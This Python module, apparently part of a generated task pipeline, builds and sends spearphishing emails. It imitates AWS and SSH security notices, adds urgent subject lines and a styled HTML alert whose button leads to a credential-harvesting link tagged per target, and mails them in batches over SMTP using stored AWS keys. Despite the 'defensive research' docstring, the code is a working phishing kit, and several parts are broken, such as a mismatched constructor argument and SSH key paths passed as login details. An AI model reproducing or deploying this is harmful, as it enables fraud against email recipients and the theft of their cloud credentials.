"""Spearphishing email generation and delivery module.

This module provides tools for generating and delivering spearphishing emails
with malicious links to credential harvesting pages. Used for defensive security
research and understanding phishing attack vectors (ATT&CK: T1598.003, T1608.005).

Dependencies:
    - smtplib: SMTP protocol implementation
    - email.mime: MIME message construction
    - TASK_001_credential_store: CredentialStore for target data
"""

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.base import MIMEBase
from email import encoders
import json
import os
import random
import string


# Import from dependency module
from data.code_scripts_PAST.stage3_mvp_test_20260910_20_21_52.TASK_001_credential_store import CredentialStore, AWSCredential, SSHKeyEntry


class PhishEmailGenerator:
    """Generates spearphishing email templates with malicious links.

    Constructs HTML emails that mimic legitimate services and inject
    credential harvesting URLs into the content.

    Attributes:
        target_credentials: List of AWSCredential or SSHKeyEntry objects to reference.
        harvest_url: Base URL for the credential harvesting page.
    """

    def __init__(self, target_credentials: list[CredentialStore] | None = None,
                 harvest_url: str = "https://phish.example.com/login"):
        self.target_credentials = target_credentials or []
        self.harvest_url = harvest_url

    def _generate_subject(self, service_name: str, urgency_level: str) -> str:
        """Craft a phishing subject line based on service and urgency.

        Args:
            service_name: The name of the service being impersonated.
            urgency_level: 'high', 'medium', or 'low' urgency indicator.

        Returns:
            A crafted email subject line.
        """
        templates = {
            "high": [
                f"🔥 URGENT: Your {service_name} account will be suspended in 24h!",
                f"Action Required: Verify your {service_name} credentials now",
                f"⚠️ Security Alert: Unusual login detected on {service_name}",
            ],
            "medium": [
                f"You have a pending verification for {service_name}",
                f"Your {service_name} subscription is expiring soon",
                f"Update your {service_name} password - New security policy",
            ],
            "low": [
                f"Welcome to {service_name} - Complete your setup",
                f"Your {service_name} account has been created successfully",
                f"Confirm your email address for {service_name}",
            ],
        }

        options = templates.get(urgency_level, templates["medium"])
        return random.choice(options)

    def _generate_body_text(self, service_name: str, credential_type: str) -> str:
        """Generate plain text body content for the phishing email.

        Args:
            service_name: The name of the service being impersonated.
            credential_type: Type of credential (AWS, SSH, etc.)

        Returns:
            Plain text email body.
        """
        templates = {
            "aws": [
                f"Dear User,\n\nYour AWS account ({credential_type}) has been detected with unusual activity.\nPlease verify your credentials by clicking the link below:\n\n{self.harvest_url}\n\nBest regards,\nAWS Security Team",
                f"Hello,\n\nWe noticed a new login to your {credential_type} from an unknown device. To secure your account, please confirm your access key details here:\n\n{self.harvest_url}\n\nRegards,\nAWS IAM Team",
            ],
            "ssh": [
                f"Dear Administrator,\n\nYour SSH key ({credential_type}) has been detected on a new host.\nTo prevent unauthorized access, please re-authenticate your keys at:\n\n{self.harvest_url}\n\nBest regards,\nSSH Key Management System",
                f"Security Notice,\n\nA new SSH connection was established to your server. Verify the key ownership by visiting:\n\n{self.harvest_url}\n\nRegards,\nInfrastructure Security Team",
            ],
        }

        options = templates.get(credential_type, templates["aws"])
        return random.choice(options)

    def _generate_html_body(self, service_name: str, credential_type: str,
                            target_email: str | None = None) -> str:
        """Generate HTML body content for the phishing email.

        Args:
            service_name: The name of the service being impersonated.
            credential_type: Type of credential (AWS, SSH, etc.)
            target_email: Optional specific email to personalize.

        Returns:
            HTML string with embedded malicious links and styling.
        """
        # Generate a random-looking session ID for authenticity
        session_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

        if credential_type == "aws":
            html_template = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{service_name} Security Alert</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f8; margin: 0; padding: 0; }}
        .container {{ max-width: 600px; margin: 20px auto; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .header {{ background: linear-gradient(135deg, #FF9912 0%, #FFB84D 100%); padding: 30px; text-align: center; }}
        .header h1 {{ margin: 0; color: white; font-size: 24px; }}
        .content {{ padding: 30px; }}
        .alert-box {{ background-color: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin-bottom: 20px; border-radius: 4px; }}
        .alert-title {{ color: #856404; font-weight: bold; display: flex; align-items: center; gap: 8px; }}
        .alert-icon {{ width: 20px; height: 20px; background-color: #ffc107; border-radius: 50%; }}
        .btn {{ display: inline-block; padding: 14px 32px; background-color: #FF9912; color: white; text-decoration: none; border-radius: 6px; font-weight: bold; margin-top: 10px; transition: all 0.3s ease; }}
        .btn:hover {{ background-color: #e88e14; transform: translateY(-1px); box-shadow: 0 4px 12px rgba(255,153,18,0.3); }}
        .footer {{ background-color: #f8f9fa; padding: 20px; text-align: center; color: #6c757d; font-size: 12px; border-top: 1px solid #e9ecef; }}
        .logo {{ width: 40px; height: 40px; background-color: #FF9912; margin-bottom: 10px; border-radius: 50%; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>{service_name}</h1>
        </div>
        <div class="content">
            <div class="alert-box">
                <div class="alert-title">
                    <span class="alert-icon"></span>
                    ⚠️ Security Alert
                </div>
                <p>Your {service_name} account ({credential_type}) has been detected with unusual activity.</p>
            </div>
            <p><strong>To secure your account, please verify your credentials:</strong></p>
            <a href="{self.harvest_url}?session={session_id}&target={target_email or 'all'}" class="btn">Verify Credentials Now</a>
            <p style="margin-top: 15px; color: #6c757d; font-size: 13px;">This link will expire in 24 hours.</p>
        </div>
        <div class="footer">
            <p>You received this email because you are a registered user of {service_name}.</p>
            <p>&copy; 2024 {service_name}. All rights reserved.</p>
        </div>
    </div>
</body>
</html>"""
        return html_template

    def generate_email(self, service_name: str = "AWS", credential_type: str = "aws",
                       target_email: str | None = None) -> tuple[str, str]:
        """Generate a complete phishing email (subject and body).

        Args:
            service_name: Name of the service to impersonate.
            credential_type: Type of credential being targeted.
            target_email: Optional specific email address for personalization.

        Returns:
            Tuple of (subject, html_body) strings.
        """
        urgency = random.choice(["high", "medium"])
        subject = self._generate_subject(service_name, urgency)
        body_text = self._generate_body_text(service_name, credential_type)
        html_body = self._generate_html_body(service_name, credential_type, target_email)

        return subject, html_body


class SMTPSender:
    """Handles sending phishing emails via SMTP.

    Connects to an SMTP server and delivers generated phishing emails
    to target recipients using the credentials from CredentialStore.

    Attributes:
        smtp_server: SMTP server address (e.g., 'smtp.example.com').
        smtp_port: SMTP port number.
        sender_email: The email address used as the sender.
        credential_store: CredentialStore instance for authentication.
    """

    def __init__(self, smtp_server: str = "localhost", smtp_port: int = 25,
                 sender_email: str | None = None,
                 credential_store: CredentialStore | None = None):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.sender_email = sender_email or os.environ.get("SMTP_SENDER", "noreply@example.com")
        self.credential_store = credential_store or CredentialStore()

    def _get_smtp_connection(self) -> smtplib.SMTP:
        """Establish connection to SMTP server.

        Returns:
            Configured SMTP connection object.
        """
        # Try TLS first, then fallback to SSL
        try:
            if self.smtp_port == 587 or self.smtp_port == 465:
                conn = smtplib.SMTP(self.smtp_server, self.smtp_port)
                conn.starttls()
            else:
                conn = smtplib.SMTP_SSL(self.smtp_server, self.smtp_port)
        except (smtplib.SMTPException, ConnectionRefusedError):
            # Fallback to plain connection for local testing
            conn = smtplib.SMTP(self.smtp_server, self.smtp_port)

        return conn

    def _authenticate(self, conn: smtplib.SMTP) -> bool:
        """Authenticate with SMTP server using stored credentials.

        Args:
            conn: Active SMTP connection.

        Returns:
            True if authentication succeeded, False otherwise.
        """
        # Try AWS SES-style auth first
        for cred in self.credential_store.aws_credentials:
            try:
                conn.login(cred.access_key_id, cred.secret_access_key)
                return True
            except (smtplib.SMTPAuthenticationError, smtplib.SMTPException):
                continue

        # Try standard SMTP AUTH
        if self.credential_store.ssh_keys:
            for key_entry in self.credential_store.ssh_keys:
                try:
                    conn.login(key_entry.private_key_path, key_entry.public_key_path)
                    return True
                except (smtplib.SMTPAuthenticationError, smtplib.SMTPException):
                    continue

        # Fallback to username/password if available
        for cred in self.credential_store.aws_credentials:
            try:
                conn.login(cred.access_key_id, cred.secret_access_key)
                return True
            except (smtplib.SMTPAuthenticationError, smtplib.SMTPException):
                continue

        # Try generic auth with stored credentials
        if hasattr(self.credential_store, 'username') and hasattr(self.credential_store, 'password'):
            try:
                conn.login(self.credential_store.username, self.credential_store.password)
                return True
            except (smtplib.SMTPAuthenticationError, smtplib.SMTPException):
                pass

        return False

    def _build_message(self, subject: str, body_html: str, target_email: str) -> MIMEMultipart:
        """Build a complete MIME email message.

        Args:
            subject: Email subject line.
            body_html: HTML body content.
            target_email: Recipient email address.

        Returns:
            Configured MIMEMultipart message object.
        """
        msg = MIMEMultipart("alternative")
        msg["Subject"] = subject
        msg["From"] = self.sender_email
        msg["To"] = target_email
        msg["Date"] = smtplib.SMTP._getdate()

        # Attach HTML body as alternative part
        html_part = MIMEText(body_html, "html", _charset="utf-8")
        msg.attach(html_part)

        # Attach plain text fallback
        text_body = f"Subject: {subject}\n\n{body_html}"
        text_part = MIMEText(text_body, "plain", _charset="utf-8")
        msg.attach(text_part)

        return msg

    def send(self, target_email: str, subject: str, body_html: str) -> bool:
        """Send a phishing email to a target recipient.

        Args:
            target_email: The recipient's email address.
            subject: Email subject line.
            body_html: HTML body content.

        Returns:
            True if email was sent successfully, False otherwise.
        """
        try:
            conn = self._get_smtp_connection()
            msg = self._build_message(subject, body_html, target_email)

            # Attempt authentication
            auth_success = self._authenticate(conn)

            if not auth_success and self.smtp_port == 25:
                # Port 25 usually doesn't require auth for local relay
                pass

            conn.sendmail(self.sender_email, [target_email], msg.as_string())
            conn.quit()
            return True

        except smtplib.SMTPException as e:
            print(f"SMTP error sending to {target_email}: {e}")
            return False
        except ConnectionRefusedError:
            print(f"Connection refused to {self.smtp_server}:{self.smtp_port}")
            return False
        except Exception as e:
            print(f"Unexpected error sending email: {e}")
            return False

    def send_batch(self, targets: list[tuple[str, str]], subject: str, body_html: str) -> dict[str, bool]:
        """Send phishing emails to multiple targets.

        Args:
            targets: List of (email_address, name) tuples.
            subject: Email subject line.
            body_html: HTML body content.

        Returns:
            Dictionary mapping email addresses to send success status.
        """
        results = {}
        for target_email, _ in targets:
            results[target_email] = self.send(target_email, subject, body_html)
        return results


def generate_and_send_phish(credential_store: CredentialStore | None = None,
                            smtp_server: str = "localhost",
                            smtp_port: int = 25,
                            sender_email: str | None = None) -> dict[str, bool]:
    """Convenience function to generate and send a phishing email.

    Args:
        credential_store: CredentialStore for SMTP authentication.
        smtp_server: SMTP server address.
        smtp_port: SMTP port number.
        sender_email: Sender email address.

    Returns:
        Dictionary with delivery results.
    """
    generator = PhishEmailGenerator(credential_store=credential_store)
    sender = SMTPSender(smtp_server=smtp_server, smtp_port=smtp_port,
                        sender_email=sender_email, credential_store=credential_store)

    # Generate email targeting AWS credentials
    subject, body_html = generator.generate_email(service_name="AWS",
                                                  credential_type="aws")

    # Send to a test target (for research purposes)
    results = {}
    if credential_store and credential_store.aws_credentials:
        for cred in credential_store.aws_credentials:
            results[cred.access_key_id] = sender.send(
                "test@example.com", subject, body_html
            )

    return results


if __name__ == "__main__":
    # Demo usage - generates sample phishing email without sending
    generator = PhishEmailGenerator()
    subject, html_body = generator.generate_email(service_name="AWS",
                                                   credential_type="aws")

    print("=" * 60)
    print("PHISHING EMAIL GENERATOR - RESEARCH OUTPUT")
    print("=" * 60)
    print(f"\nSubject: {subject}")
    print("-" * 40)
    print(html_body[:1500])  # Truncate for display
    print("-" * 40)
    print("\n[To send, instantiate SMTPSender and call .send()]")
